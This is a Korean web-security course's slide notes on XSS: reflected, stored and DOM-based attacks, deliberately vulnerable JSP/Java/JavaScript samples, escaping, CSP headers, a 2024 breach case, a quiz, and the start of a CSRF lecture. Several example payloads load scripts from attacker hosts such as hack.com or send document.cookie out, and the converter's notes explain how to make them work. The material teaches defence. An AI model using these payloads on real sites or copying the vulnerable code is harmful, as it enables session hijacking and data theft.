폼에 입력된 민감 데이터(이메일, 전화번호, 카드번호 등) 탈취
브라우저 무단 제어
임의 스크립트 실행 → 가짜 폼 표시, 피싱 페이지로 이동, 내부 네트워크 스캔 등
기업 이미지 타격
보안 사고 발생 시 신뢰도 하락, 법적 책임 가능성

---

## [2-SLIDES] 7주차 2차시 p.9 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.10 · XSS 공격 유형 및 기법 – Reflected XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

사용자가 요청한 값을 서버에서 검증하지 않고 응답으로 사용하는 경우 발생

[도식] 공격자(노트북) → 사용자(PC, 머리 위에 빨간 폭발 모양 "Script 실행") ↔ 서버

- ① 이메일로 URL 전달 (공격자 → 사용자)
- ② URL을 클릭하여 요청 (사용자 → 서버)
- ③ 공격자의 Script 전송 (서버 → 사용자)

빨간 점선 박스 1 (공격자가 보낸 이메일 내용, 노란 화살표로 사용자에게 전달됨):

```html
고객님이 요청하신 새로운 제품이 입고 되었습니다.
확인해보세요.
<a href =http://a.com/1.do?name=<script src=
“http://hack.com/hook.js”/>확인</a>
```

빨간 점선 박스 2 (서버 응답 화면, 노란 화살표로 서버 → 사용자에게 돌아옴):

```html
<script src=‘http://hack.com/hook.js”/> 님 환영합니다.
```

→ name 파라미터 값이 검증 없이 "○○ 님 환영합니다." 응답에 그대로 반영되어, 사용자의 브라우저에서 hack.com의 hook.js가 로드·실행됨.

(※ 원문 표기 그대로 — 응답 박스의 따옴표가 여는 쪽 `‘`(작은 곡선 따옴표), 닫는 쪽 `”`(큰 곡선 따옴표)로 짝이 맞지 않고, 이메일 박스도 곡선 따옴표 `“ ”` 사용)
(※ 검증: 개념 설명용 축약 예시. 실제 HTML에서는 ① `<script .../>` 처럼 자기 닫기로 쓴 script 태그는 닫힌 것으로 인정되지 않아 `</script>`가 필요하고, ② 곡선 따옴표는 속성값 구분자로 인식되지 않으며, ③ href 값이 따옴표 없이 쓰여 `<`, 공백 등에서 끊기므로 실제 링크에는 `name=%3Cscript%20src%3D...%3E%3C%2Fscript%3E`처럼 URL 인코딩된 페이로드를 넣어야 함)

---

## [2-SLIDES] 7주차 2차시 p.11 · XSS 공격 유형 및 기법 – Reflected XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**안전하지 않은 코드** (빨간 라벨)

```jsp
// JSP VULNERABLE code to XSS reflected #FAIL
<% String customerID = request.getParameter("id"); %>
Customer ID: <%= customerID %>

// code in a VULNERABLE Servlet to XSS reflected #FAIL
out.writeln("you searched for: "+request.getParameter("q"));
```
(코드 이미지에서 `customerID`(두 곳)와 `"q"`의 q가 빨간색으로 강조됨 — 외부 입력이 그대로 출력되는 지점)

id나 q의 값이 다음과 같은 패턴의 값이 입력된다면 XSS 공격이 실행되게 된다.

```text
http://mywebsite.com/customers?id=1234'><script src=http://ha.ckers.org/xss.js></script>'
http://mywebsite.com/customers?id=1234"><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?'%20+document.cookie</script>
```

(※ 검증: Python `urllib.parse.parse_qs`로 서버가 받는 id 값을 확인 — 첫 번째 URL은 `1234'><script src=http://ha.ckers.org/xss.js></script>'`가 그대로 전달되어 JSP 출력이 `Customer ID: 1234'><script src=http://ha.ckers.org/xss.js></script>'`가 됨 → 외부 스크립트 로드, 일치. 두 번째 URL은 쿼리스트링 디코딩 시 `%20`과 `+`가 모두 공백으로 바뀌어 `document.location='...cookie.cgi?'  document.cookie`가 되므로(Java `getParameter`도 동일하게 `+`→공백) 연결 연산자가 사라져 JS 문법 오류가 남. 실제로 쿠키를 붙이려면 `+`를 `%2B`로 인코딩해야 함 — 원문 예시는 OWASP 문서의 고전 예시를 그대로 옮긴 것)
(※ 원문 표기 그대로 — Java의 `PrintWriter`/`JspWriter`에는 `writeln` 메서드가 없음(`println`이 맞음). p.32 퀴즈에서는 `out.println(...)`으로 표기)

---

## [2-SLIDES] 7주차 2차시 p.12 · XSS 공격 유형 및 기법 – Reflected XSS
XSS 공격 유형 및 기법 – Reflected XSS
Reflected XSS LAB 시연 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

## [2-SLIDES] 7주차 2차시 p.13 · XSS 공격 유형 및 기법 – Stored XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

공격자가 서버에 저장한 스크립트를 사용자가 열람하는 경우 스크립트가 다운로드 되어 사용자의 브라우저에서 실행

[도식] 공격자 / 서버 / 데이터베이스 / 사용자(PC 위에 빨간 폭발 모양 "Script 실행")

- ① Script 삽입 글 등록 (공격자 → 서버)
- ② Script 삽입 글 저장 (서버 → 데이터베이스)
- ③ 공격자의 글 열람 (사용자 → 서버)
- ④ 공격자의 Script 전송 (데이터베이스 → 서버 → 사용자)
- ⑤ 사용자 정보 획득 (사용자 → 공격자) — 옆의 빨간 점선 박스: **쿠키값전달** (노란 화살표로 공격자 쪽을 가리킴)

빨간 점선 박스(아래, 노란 화살표로 ① 등록 경로를 가리킴):

```html
게시물을 작성하여 DB에 저장
<script src=“http://hack.com/receive.do?param=“+document.cookie/>
```

빨간 점선 박스(위, 노란 화살표로 사용자 쪽을 가리킴 — 사용자 브라우저에서 실행되는 스크립트):

```html
<script src=“http://hack.com/receive.do?param=“+document.cookie/>
```

(※ 원문 표기 그대로 — 곡선 따옴표 `“`가 여닫는 쪽 모두 같은 모양)
(※ 검증: 개념 설명용 축약 예시. src 속성값은 문자열일 뿐 JavaScript로 평가되지 않으므로 `+document.cookie`가 쿠키 값으로 치환되지 않으며, `<script .../>` 자기 닫기도 HTML에서 인정되지 않음. 실제로 쿠키를 전송하는 형태는 예: `<script>new Image().src='http://hack.com/receive.do?param='+document.cookie</script>`)

---

## [2-SLIDES] 7주차 2차시 p.14 · XSS 공격 유형 및 기법 – Stored XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

다음 서블릿 코드는 Stored XSS에 취약하다.

**안전하지 않은 코드** (빨간 라벨)

```java
final String id = httpRequest.getParameter ("id")        // parameter from the request
final String sql = "SELECT * FROM Customers WHERE CustomerID =?";
final PreparedStatement ps = con.prepareStatement (sql);
ps.setString (1, id);
ResultSet rs = ps.executeQuery ();
```

PreparedStatement는 SQL Injection을 예방하기는 하지만 XSS 취약점에 대해서는 예방책이 없다.
DB에서 읽어온 데이터를 체크하지 않고 그대로 HTML 페이지에 보내준다.

```java
out.writeln (<tr> <td> "+ rs.getString (" name ")+"</ td> <td> "+
                         rs.getString (" comment ")+"</ td></ tr> ");
```

(※ 검증: 바인딩 변수 `?`에 `setString(1, id)`로 값을 넣으므로 SQL 쿼리 구조는 `SELECT * FROM Customers WHERE CustomerID =?` 그대로 유지되어 SQL Injection은 방지됨 — 설명과 일치. 그러나 name/comment 컬럼에 저장된 `<script>...` 문자열은 이스케이프 없이 HTML로 출력되므로 Stored XSS 발생 — 설명과 일치)
(※ 원문 표기 그대로 — 컴파일되지 않는 축약 코드: 첫 줄 끝 `;` 누락, `out.writeln (` 뒤 여는 따옴표 누락(`("<tr><td>"+`가 맞음), `writeln`은 Java에 없는 메서드(`println`), `" name "`·`" comment "`처럼 컬럼명 앞뒤 공백, `</ td>`·`</ tr>`처럼 닫는 태그 안의 공백)

---

## [2-SLIDES] 7주차 2차시 p.15 · XSS 공격 유형 및 기법 – Stored XSS
XSS 공격 유형 및 기법 – Stored XSS
- Stored XSS LAB 시연 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

## [2-SLIDES] 7주차 2차시 p.16 · XSS 공격 유형 및 기법 – DOM 기반 XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

자바스크립트로 DOM 객체 정보를 사용하여 Document에 write를 수행하는 경우
스크립트가 사용자의 브라우저에서 실행

[도식] 사용자(PC, 머리 위 빨간 폭발 모양 "Script 실행") ↔ 서버

- ① `http://a.com/hello.do` : 사용자 로그인 요청 (사용자 → 서버)
- ② `http://a.com/good.do?menu=요청처리함` : 초기 화면인 '요청처리함'으로 리다이렉트 (서버 → 사용자)
- ③ 공격자는 파악된 URL 내용을 변조하여 사용자가 링크를 클릭하도록 피싱메일 등으로 유도 (빨간 글씨)
- ④ `http://a.com/good.do?menu=<script src=http://hack.com/do.js/>` : 사용자가 악성 URL 클릭 (빨간 글씨, 사용자 → 서버)
- ⑤ 정상적으로 “요청처리함” 화면 표시 (서버 → 사용자)
- ⑤ (사용자 아래의 순환 화살표, 빨간 글씨) 자바스크립트로 URL의 일부인 menu 값을 document.write()로 화면에 출력하는 경우 브라우저에서 스크립트가 실행

→ 서버 응답 자체는 정상이지만, 클라이언트 측 스크립트가 URL의 menu 값을 DOM에 써 넣는 과정에서 스크립트가 실행됨.

(※ 원문 표기 그대로 — ⑤ 번호가 두 번 사용됨)
(※ 검증: `<script src=http://hack.com/do.js/>`에서 따옴표 없는 src 값은 공백이나 `>` 전까지이므로 `http://hack.com/do.js/`(끝에 `/` 포함)로 해석되고, 닫는 `</script>`가 없어 실제로는 동작이 불확실 — 개념 설명용 축약 예시)

---

## [2-SLIDES] 7주차 2차시 p.17 · XSS 공격 유형 및 기법 – DOM 기반 XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**안전하지 않은 코드** (빨간 라벨)

```html
<script>
   var  a= document.URL;
   a=decodeURIComponent(a);
   document.write(a.substring(a.indexOf(“message=“)+8, a.length);
</script>
```

해당 스크립트는 메시지 매개변수의 값을 추출하기 위해
URL 매개변수에서 message= 의 값으로 전달되는 값을 추출하여
HTML 에 추가하여 사용자에게 보여준다.

URL 값이 다음과 같다면 공격자가 의도한 스크립트가 해당 브라우저에 실행된다.

```text
http://example.com/error.jsp?message=<script>alert('xss');</script>
```
(이 URL은 슬라이드에서 빨간 글씨로 강조)

(※ 검증: Python으로 동작 재현 — `len("message=") = 8`이므로 `indexOf("message=")+8`은 값의 시작 위치가 맞고, 추출 결과는 `<script>alert('xss');</script>`. 브라우저가 `<`, `>`를 `%3C`, `%3E`로 인코딩해 document.URL에 넣더라도 `decodeURIComponent`로 다시 복원되므로 document.write로 그대로 삽입되어 실행됨 — 설명과 일치)
(※ 원문 표기 그대로 — `“message=“`에 곡선 따옴표가 쓰여 있고 `document.write(` 의 닫는 괄호 `)`가 하나 부족함. 실제 코드라면 `document.write(a.substring(a.indexOf("message=")+8, a.length));`)

---

## [2-SLIDES] 7주차 2차시 p.18 · XSS 공격 유형 및 기법 – DOM 기반 XSS
XSS 공격 유형 및 기법 – DOM 기반 XSS
- DOM 기반 XSS 시연 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

## [2-SLIDES] 7주차 2차시 p.19 · 사고 사례
사고 사례

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[왼쪽 이미지] 경향신문(경제 섹션) 기사 캡처 — 제목 "대성학원·시대인재 해킹…수험생 11만명 정보 유출", 입력 2024.03.28 21:07.
(기사 본문 요약 — 저작권 보호를 위해 원문 대신 요약)
- 두 회사 모두 해킹으로 수강생 개인정보가 유출되었고 사고 후 대응도 미흡했다는 내용.
- **빨간 박스로 강조된 부분**: 디지털대성은 1월 12~16일 공격을 받음. 해커는 먼저 다른 곳에서 확보한 아이디·비밀번호를 무작위로 대입하는 크리덴셜 스터핑으로 회원 A의 계정을 탈취하고, 그 계정으로 불법이용 신고 게시판에 악성 스크립트가 든 글을 올림. 직원이 이 글을 열람하면서 스크립트가 실행되는 XSS 공격이 일어나 내부 보안 정보가 유출됨.
- 이후 부분: 이 공격으로 디지털대성 회원 약 9만5000명의 개인정보가 유출되었고, 보안시스템이 있었지만 급증한 로그인 시도를 탐지하지 못했으며, 유출 사실 인지 후 72시간이 지나서야 알렸다는 내용.

[오른쪽 도식] < 개인정보 유출 경위 >
- 크리덴셜 스터핑 공격 (점선 박스): 해커 → ① 무작위 로그인 시도 ('24. 1. 12. 12:01) → 로그인 화면(아이디/비밀번호 입력, 네이버·카카오 로그인 버튼) → 회원 A 계정 탈취
- XSS 공격 (점선 박스): 회원 A → ② 악성 스크립트 삽입 ('24. 1. 15. 17:05) → 불법이용 신고 게시판 → ③ 게시글 열람 ('24. 1. 16. 09:04, 직원 A, B) → ④ 직원 A,B 세션 탈취 → 직원 A, B 세션
- 직원 A, B 세션으로 → ⑤ 서비스 접속 ('24. 1. 16. 11:18 / '24. 1. 16. 14:10) → 관리용 웹 서비스 → ⑥ 개인정보 열람 (문서 아이콘)

→ 계정 탈취 후 Stored XSS로 관리자(직원) 세션을 훔쳐 관리 시스템에 접속한 실제 사례.

---

## [2-SLIDES] 7주차 2차시 p.20 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.21 · 입출력 값 검증 및 필터링
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**제한적인 입력 값 허용**
클라이언트 프로그램과 서버 애플리케이션에서 HTTP 헤더, 쿠키, 쿼리 스트링, 폼 필드, 히든 필드 등의 모든 인자들에 대해
허용된 유형의 데이터만을 받아들이도록 정규식을 이용하여 제한된 입력 값을 받아서 처리하도록 한다.

**제한적인 출력 값 허용**
입력 값이나 DB에서 조회한 결과 값을 응답으로 내보내기전에
XssFilter를 적용하여 동적으로 스크립트가 실행될 수 있는 요소들은 HTML인코딩을 적용하여 출력한다.

• 필터링 또는 변환되어야 하는 특수문자들

| 일반 | URL Encoding | HTML Encoding | 일반 | URL Encoding | HTML Encoding | 일반 | URL Encoding | HTML Encoding |
|---|---|---|---|---|---|---|---|---|
| ' | %27 | &#x27; &apos; | [ | %5b | &#x5b; | % | %25 | &#x25; |
| " | %22 | &#x22; &quot; | ] | %5d | &#x5d; | & | %26 | &#x26; &amp; |
| : | %3a | &#x3a; | { | %7b | &#x7b; | ? | %3f | &#x3f; |
| ; | %3b | &#x3b; | } | %7d | &#x7d; | ! | %21 | &#x21; |
| ( | %28 | &#x28; | ` | %60 | &#x60; | @ | %40 | &#x40; |
| ) | %29 | &#x29; | = | %3d | &#x3d; | * | %2a | &#x2a; |
| < | %3c | &#x3c; &lt; | # | %23 | &#x23; | TAB | %09 | &#x09; |
| > | %3e | &#x3e; &gt; | $ | %24 | &#x24; | \| | %7c | &#x7c; |

(※ 검증: Python으로 24개 문자 모두 확인 — `urllib.parse.unquote`(URL 인코딩)와 `html.unescape`(16진 숫자 참조·이름 참조) 결과가 각 원문자와 일치. 참고로 `&apos;`는 HTML5/XML에서 정의된 이름 참조로, 구형 HTML4 브라우저 호환이 필요하면 `&#x27;` 사용)

---

## [2-SLIDES] 7주차 2차시 p.22 · 입출력 값 검증 및 필터링
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

차단되어야 하는 태그들

| | | |
|---|---|---|
| `<script>` | `<object>` | `<img>` |
| `<javascript>` | `<marquee>` | `<embed>` |
| `<vbscript>` | `<qss>` | `<table>` |
| `<livescript>` | `<body>` | `<isindex>` |
| `<iframe>` | `<input>` | `<meta>` |
| `<frameset>` | `<form>` | `<http-equiv>` |
| `<mocha>` | `<div>` | `<xss>` |
| `<applet>` | `<style>` | `<href>` |

(※ 검증: 원문 표의 일부는 실제 HTML 태그가 아님 — `javascript`, `vbscript`, `livescript`, `mocha`는 `javascript:` 같은 URL 스킴(스크립트 언어 이름), `http-equiv`(meta 태그 속성)와 `href`(a 태그 등의 속성)는 속성 이름, `<qss>`, `<xss>`는 표준 태그가 아님. 필터링 키워드 목록으로 이해하면 됨)

---

## [2-SLIDES] 7주차 2차시 p.23 · HTML 엔티티 이스케이프 처리
HTML 엔티티 이스케이프 처리
HTML 엔티티 이스케이프(Entity Escape) 란?
HTML 문서에서 특수 문자가 브라우저에 의해 태그나 코드로 해석되지 않도록,
해당 문자를 엔티티 코드(예: < → &lt;)로 변환하는 기법
XSS 공격 방어 방법
사용자 입력에 포함된 <script> 태그 등 악의적인 스크립트가 실행되지 않도록 보호
서버와 클라이언트 모두에서 출력 전에 반드시 이스케이프 처리 필요
적용해야 하는 위치
동적 콘텐츠 출력 시, 특히 사용자 입력을 직접 HTML에 삽입하는 경우

---

## [2-SLIDES] 7주차 2차시 p.24 · HTML 엔티티 이스케이프 처리
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**취약한 코드 (이스케이프 미적용)**
사용자 입력을 그대로 HTML에 삽입하여 XSS 공격에 노출

**예시**

```javascript
// 사용자 입력을 가져와서 그대로 innerHTML에 할당 (취약)
var userInput = getUserInput();
document.getElementById("content").innerHTML = userInput;
```

**공격 시나리오**
사용자가 <script>alert('XSS');</script>와 같은 입력을 전달하면,
해당 스크립트가 실행되어 공격자가 쿠키 탈취, 세션 하이재킹 등 다양한 공격을 수행할 수 있음

(※ 검증: HTML5 명세상 innerHTML로 삽입된 `<script>` 요소는 실행되지 않음. 따라서 이 시나리오의 `<script>alert('XSS');</script>` 입력 자체는 실행되지 않으며, 실제 공격은 `<img src=x onerror=alert('XSS')>`처럼 이벤트 핸들러를 이용한 입력으로 이루어짐 — innerHTML이 XSS에 취약하다는 결론은 맞음)

---

## [2-SLIDES] 7주차 2차시 p.25 · HTML 엔티티 이스케이프 처리
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**안전한 코드 구현**
- 방법 1: 사용자 입력 이스케이프 함수 적용
  - 사용자 입력을 HTML 엔티티로 변환하는 함수를 사용하여 안전하게 출력
- 방법 2: textContent 속성 사용
  - DOM에 텍스트만 삽입하여 브라우저가 HTML로 해석하지 않도록 함

**효과**
이스케이프 처리를 통해 악의적인 스크립트가 실행되지 않으며, 안전한 텍스트로 표시됨

```javascript
function escapeHtml(text) {
    return text.replace(/&/g, "&amp;")
               .replace(/</g, "&lt;")
               .replace(/>/g, "&gt;")
               .replace(/"/g, "&quot;")
               .replace(/'/g, "&#039;");
}

var userInput = getUserInput(); // 예: "<script>alert('XSS');</script>"
var safeInput = escapeHtml(userInput);
document.getElementById("content").innerHTML = safeInput;
```
< 방법 1: 사용자 입력 이스케이프 함수 적용 >

```javascript
var userInput = getUserInput(); // 사용자 입력
document.getElementById("content").textContent = userInput;
```
< 방법 2: textContent 속성 사용 >

(※ 검증: Python으로 같은 치환 순서를 재현 — 입력 `<script>alert('XSS');</script>` → `&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;`, 다시 unescape하면 원문과 동일하므로 화면에는 글자 그대로 표시되고 실행되지 않음 — 일치. `&`를 가장 먼저 치환해야 이후에 만든 `&lt;` 등이 `&amp;lt;`로 이중 변환되지 않음 — 원문 순서가 올바름)

---

## [2-SLIDES] 7주차 2차시 p.26 · Spring Web MVC에서 입출력 필터링
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

• Spring Web MVC 프레임워크를 사용하는 경우 입력 값 필터링 정책 적용

[도식] Spring MVC 요청 처리 흐름과 필터링 지점

```text
Client --User Request  Filter    DispatcherServlet  <  HandlerMapping
Client <--User Response-- Filter  <--  DispatcherServlet
                                       DispatcherServlet  <  Handler Interceptor  <  Handler(Controller)
                                                                                           ├ Data binding
                                                                                           ├ Validation
                                                                                           │   ↓
                                                                                           └ Business Logic
                                                                                           HandlerExceptionResolver
                                       DispatcherServlet     View Resolver
                                       DispatcherServlet     View
```

필터링 수행 위치(파란 테두리 말풍선):
- 입력 값에 대해 필터링 수행 → **Filter**
- 입력 값에 대해 Interceptor에서 필터링 수행 → **Handler Interceptor**
- 입력 값에 대해 Controller Validator 에서 필터링 수행 → Handler(Controller) 안의 **Validation**
- 출력 값에 대해 Controller 에서 필터링 수행 → **Handler(Controller)** (Business Logic 결과)
- 출력 값에 대해 View 에서 필터링 수행 → **View**

→ 요청은 Client → Filter → DispatcherServlet → HandlerMapping으로 처리할 핸들러를 찾고 → Handler Interceptor → Controller(Data binding → Validation → Business Logic)를 거치며, 응답은 역방향으로 Interceptor → DispatcherServlet → View Resolver/View → Filter → Client로 반환됨. 예외는 HandlerExceptionResolver가 처리.

---

## [2-SLIDES] 7주차 2차시 p.27 · CSP(Content-Security-Policy) 적용
CSP(Content-Security-Policy) 적용
HTTP 응답 헤더 CSP를 통해 설정함
XSS 공격 방어 효과
- 인라인 스크립트 차단
기본적으로 'unsafe-inline' 없이 스크립트 실행을 제한하여, 악의적으로 삽입된 인라인 코드가 실행되지 않도록 함
- 신뢰하는 스크립트만 허용
신뢰할 수 있는 도메인에서 제공하는 스크립트만 로드하게 하여, 외부 공격자의 스크립트 주입 차단
- 동적 코드 실행 방지
eval()이나 new Function() 같은 동적 코드 실행을 제한할 수 있음
XSS 방어와 CSP의 연계
CSP는 XSS 취약점이 존재하더라도, 악의적 스크립트 실행을 실질적으로 차단하여 추가적인 방어층을 제공

---

## [2-SLIDES] 7주차 2차시 p.28 · CSP(Content-Security-Policy) 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

• 예시: 웹 서버별 CSP 헤더 설정

• Apache 예시: httpd.conf 또는 .htaccess 내에 설정

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';"
```

• Nginx 예시: nginx.conf 또는 해당 서버 블록 내에 설정

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';";
```

(※ 검증: Python으로 정책 문자열을 `;` 기준으로 파싱 — `default-src 'self'`, `script-src 'self' https://trusted.cdn.com`, `object-src 'none'` 3개 지시어와 끝의 빈 항목(마지막 `;`, 허용됨). Apache는 `Header set 이름 "값"`(mod_headers 필요), Nginx는 `add_header 이름 "값";`으로 지시어 끝에 `;`가 붙는 형식 — 두 설정 모두 문법 일치. `'unsafe-inline'`이 없으므로 인라인 스크립트가 차단됨)

---

## [2-SLIDES] 7주차 2차시 p.29 · 요약 정리
요약 정리
- XSS는 검증되지 않은 입력 값으로 인해, 브라우저에서 악성 스크립트가 실행되는 취약점이다.
- Reflected, Stored, DOM 기반 XSS로 분류되며, 세션 탈취나 브라우저 조작이 가능하다.
- 특히, 게시판이나 댓글 등에 악성 코드가 삽입된 Stored XSS는 다수 사용자에게 피해를 줄 수 있다.
- 입출력 값 검증, HTML 이스케이프, CSP를 적용해 XSS를 효과적으로 막을 수 있다.
- 다단계 방어와 자동화 테스트로 재발을 방지해야 한다.

---

## [2-SLIDES] 7주차 2차시 p.30 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 7주차 2차시 p.31 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 7주차 2차시 p.32 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
   1) HTML 엔티티 이스케이프로 <script>를 무해한 텍스트로 변환
   2) CSP를 적용해 악성 스크립트 로드를 제한
   3) 입력값 필터링으로 < > 같은 특수문자 차단
   4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증

2. 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
   1) `out.println("You searched for: " + request.getParameter("q"));`
   2) `response.setHeader("Content-Security-Policy", "default-src 'self'");`
   3) `<input type="hidden" name="_csrf" value="...">`
   4) `textContent = escapeHtml(userInput);`

3. XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은?
   (영어 대문자 3글자)
   (            )

---

## [2-SLIDES] 7주차 2차시 p.33 · 퀴즈 정답
퀴즈 정답
1. 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증
CSRF 토큰은 주로 CSRF 공격 방어 기법이며, XSS 방어와는 직접 관련이 없습니다.
2. 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
1) out.println("You searched for: " + request.getParameter("q"));
사용자 입력값을 검증 없이 그대로 출력하면 XSS 공격이 발생할 수 있습니다.
3. XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은?
(영어 대문자 3글자)
( DOM )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(정답 표시: 1번의 "4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증", 2번의 "1) out.println(...)" 코드, 3번의 "DOM"이 빨간 글씨로 강조됨)

# [2-SLIDES] 7주차 3차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Stored XSS/저장형 XSS/스토어드 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · SameSite/세임사이트/Strict/Lax/None · 화이트리스트/Whitelist/최소 허용/허용 목록 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

## [2-SLIDES] 7주차 3차시 p.1 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.2 · 학습 목표
학습 목표
CSRF(크로스 사이트 요청 위조)의 개념과 공격 원리를 이해한다.
실제 CSRF 공격 기법을 학습하고, 취약점을 진단하는 방법을 익힌다.
CSRF 방어 기법을 적용하여 웹 애플리케이션 보안을 강화할 수 있다.

---

## [2-SLIDES] 7주차 3차시 p.3 · 학습 내용
학습 내용
1. CSRF 취약점 이해
2. CSRF 취약점 진단
3. CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.4 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.5 · CSRF(크로스 사이트 요청 위조)란?
CSRF(크로스 사이트 요청 위조)란?
정의
Cross-Site Request Forgery의 약자로, 사용자의 인증 정보를 이용해 의도치 않은 요청을 강제 실행하는 공격
→ 공격자가 악의적인 웹 페이지, 이메일, 또는 다른 매체를 통해 사용자의 브라우저에 요청을 보내도록 유도
취약점 배경
웹 애플리케이션이 인증 상태(쿠키 등)를 기반으로 요청을 처리하는 구조
브라우저는 같은 도메인에 대한 요청 시 자동으로 쿠키를 전송하므로, 사용자가 의도치 않은 요청에도 인증 정보를 포함하게 됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[그림: CSRF 공격 개념도 (왼쪽 → 오른쪽 흐름)]**

- 왼쪽: 후드를 쓴 가면(가이 포크스 가면) 해커가 노트북 앞에 있음 (공격자).
- → 주황색 라벨 **"CSRF"**가 붙은 화살표 → 가운데: 책상에서 노트북을 쓰는 정장 차림 사용자(로그인한 피해자).
- → 라벨 **"Cookies"**가 붙은 화살표 → 한 입 베어 문 쿠키 그림 → 화살표 → 오른쪽: 서버 본체 + 모니터. 모니터 속 브라우저 창 주소창에 `http://`, 창 안에 **"CSRF"** 글자.
- 의미: 공격자가 CSRF 요청을 사용자에게 심으면, 사용자의 브라우저가 쿠키(인증 정보)를 자동으로 붙여 서버에 요청을 보내게 됨.

---

## [2-SLIDES] 7주차 3차시 p.6 · CSRF 취약점 발생 원인
CSRF 취약점 발생 원인
인증 정보 자동 전송
브라우저는 사용자가 로그인한 사이트의 쿠키를 모든 요청에 자동으로 첨부함
